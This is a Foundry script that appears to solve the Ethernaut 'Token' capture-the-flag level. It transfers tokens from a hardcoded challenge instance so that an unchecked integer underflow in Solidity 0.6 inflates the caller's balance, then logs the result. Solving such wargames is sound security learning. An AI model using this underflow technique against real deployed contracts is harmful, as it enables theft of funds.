// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import {Token} from "ethernaut/token.sol";
import "forge-std/console.sol";

contract TokenHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Token tokenIns = Token(0xc00F75E53e452F9f198A65d7db1662493001c7fc);
        tokenIns.transfer(address(0), 21);
        console.log("balance: ", tokenIns.balanceOf(vm.envAddress("MY_ADDRESS")));

        vm.stopBroadcast();
    }
}
